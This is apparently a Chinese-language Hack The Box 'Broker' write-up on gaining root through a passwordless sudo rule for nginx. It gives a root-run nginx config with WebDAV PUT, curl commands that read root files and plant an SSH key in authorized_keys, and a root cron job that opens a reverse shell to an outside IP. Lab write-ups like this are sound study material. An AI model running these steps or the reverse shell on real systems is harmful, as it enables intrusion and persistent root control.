---
title: sudo nginx提权学习
categories:
  - Linux
tags:
  - Linux
  - PE
---
## 0x00 前言
在[Broker](https://app.hackthebox.com/machines/Broker)这台机器上学的一种提权方式，重点是nginx配置文件的学习，以及如何通过上传文件到任意位置得到root权限。

---
## 0x01 枚举
使用`sudo -l`可以得到如下信息
```bash
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```
能使用sudo通过无密码的方式以root用户的权限运行nginx命令

运行`nginx -h`得到帮助信息
```bash
nginx version: nginx/1.18.0 (Ubuntu)
Usage: nginx [-?hvVtTq] [-s signal] [-c filename] [-p prefix] [-g directives]

Options:
  -?,-h         : this help
  -v            : show version and exit
  -V            : show version and configure options then exit
  -t            : test configuration and exit
  -T            : test configuration, dump it and exit
  -q            : suppress non-error messages during configuration testing
  -s signal     : send signal to a master process: stop, quit, reopen, reload
  -p prefix     : set prefix path (default: /usr/share/nginx/)
  -c filename   : set configuration file (default: /etc/nginx/nginx.conf)
  -g directives : set global directives out of configuration file

```
可以看到-c标志能指定nginx服务的配置文件，所以我们可以通过更改配置文件的方式来利用它。

---
## 0x02 通过PUT方法上传公钥
既然可以以root用户运行nginx命令，那么我们可以写一个以root用户运行的nginx服务的配置文件，根目录就为`/`

之后使用`dav_methods PUT;`定义put方法，就可以以root用户的身份上传文件。

在/dev/shm目录下写一个nginx配置文件，名为ix1.conf

```bash
user root;
worker_processes auto;
pid /run/nginx2.pid;
events {
	worker_connections 768;
}
http {
	server {
		listen 1111;
		root /;
		autoindex on;

		dav_methods PUT;
	}	

}
```

1. **`user root;`：**
    - 设置 Nginx 进程的运行用户为 **`root`**。这是指定 Nginx 进程以特定用户身份运行的一种方式。
2. **`worker_processes 4;`：**
    - 指定启动的 Nginx worker 进程的数量为 4。Nginx 使用多进程模型，每个 worker 进程可以处理并发请求。
3. **`pid /run/nginx2.pid;`：**
    - 指定存储主进程 ID 的文件路径。Nginx 主进程的 ID 将被写入此文件，以便后续管理和监控。
4. **`events { ... }`：**
    - 定义与事件相关的配置块，如最大连接数等。
    - **`worker_connections 768;`：** 指定每个 worker 进程的最大连接数。
5. **`http { ... }`：**
    - 定义与 HTTP 相关的配置块。
    - **`server { ... }`：** 定义一个简单的虚拟主机。
        - **`listen 1111;`：** 指定监听的端口号为 1111。
        - **`root /;`：** 指定服务器的根目录为根目录（/），这表示 Nginx 将会从文件系统的根目录提供文件。
        - **`autoindex on;`：** 打开自动目录索引功能，当访问一个目录时，如果没有默认的索引文件（如 index.html），则显示该目录下的文件列表。
        - **`dav_methods PUT;`：** 启用 WebDAV 的 **`PUT`** 方法，允许客户端上传文件到服务器。

这个配置文件的目的是创建一个简单的 Nginx 服务器，监听端口 1337，允许通过 WebDAV 的 **`PUT`** 方法上传文件，同时启用了自动目录索引。请注意，实际生产环境中的配置可能需要更多的安全性和性能优化。

然后使用`sudo nginx -c`指定配置文件

```bash
sudo nginx -c /dev/shm/ix1.conf
```

运行`ss -lntp`可以看到1111端口开放，说明以上配置成功。

```bash
State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                                                                                   
LISTEN 0      511          0.0.0.0:80         0.0.0.0:*    users:(("nginx",pid=924,fd=6),("nginx",pid=923,fd=6),("nginx",pid=922,fd=6))                             
LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*    users:(("systemd-resolve",pid=519,fd=14))                                                                
LISTEN 0      128          0.0.0.0:22         0.0.0.0:*    users:(("sshd",pid=947,fd=3))                                                                            
LISTEN 0      511          0.0.0.0:1111       0.0.0.0:*    users:(("nginx",pid=3859,fd=6),("nginx",pid=3858,fd=6),("nginx",pid=3857,fd=6))                          
LISTEN 0      511          0.0.0.0:12345      0.0.0.0:*    users:(("nginx",pid=1883,fd=6),("nginx",pid=1882,fd=6),("nginx",pid=1881,fd=6),("nginx",pid=1880,fd=6),("nginx",pid=1879,fd=6),("nginx",pid=1878,fd=6))
LISTEN 0      4096               *:61613            *:*    users:(("java",pid=966,fd=145))                                                                          
LISTEN 0      50                 *:61614            *:*    users:(("java",pid=966,fd=148))                                                                          
LISTEN 0      4096               *:61616            *:*    users:(("java",pid=966,fd=143))                                                                          
LISTEN 0      128             [::]:22            [::]:*    users:(("sshd",pid=947,fd=4))                                                                            
LISTEN 0      4096               *:1883             *:*    users:(("java",pid=966,fd=146))                                                                          
LISTEN 0      50                 *:34783            *:*    users:(("java",pid=966,fd=26))                                                                           
LISTEN 0      50                 *:8161             *:*    users:(("java",pid=966,fd=154))                                                                          
LISTEN 0      4096               *:5672             *:*    users:(("java",pid=966,fd=144))
```

然后可以使用`curl`查看主机上的任意文件。

```bash
activemq@broker:/dev/shm$ curl localhost:1111/root/root.txt
xxxxxxxxxxxxxxxxxxxx
```

也可以通过`PUT`方法上传文件到任意位置。

在本机生成一个公私钥对

```bash
ssh-keygen
```

然后通过curl上传（三种方式都行）

```bash
curl -X PUT localhost:1111/root/.ssh/authorized_keys -d "$(cat root.pub)"
curl -T root.pub localhost:1111/root/.ssh/authorized_keys
curl --upload-file root.pub localhost:1111/root/.ssh/authorized_keys
```

然后通过`ssh -i`指定私钥连接。

---
## 0x03 写计划任务反弹shell
可以通过在`/var/spool/cron/crontab`下写一个root用户的计划任务反弹shell

新建一个文件内容如下

```bash
* * * * * bash -c "bash -i >& /dev/tcp/10.10.16.28/9999 0>&1"
```

意思是每一分钟执行一次。

不理解可以看`/etc/crontab`文件

```bash
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

然后上传到`/var/spool/cron/crontabs/root`

<aside> ⚠️ 在 Unix/Linux 系统中，/var/spool/cron/crontabs/ 目录通常包含了每个用户的个人 cron 作业文件。这个目录下的文件名称通常以用户名为基础，对应每个用户的 crontab 文件。这些文件包含了用户通过 crontab -e 命令编辑的定时任务。

</aside>

```bash
curl -T cron localhost:1111/var/spool/cron/crontabs/root
```

等待一分钟
![1.png](/assets/img/2023-11-18-sudo-nginx提权学习/1.png)

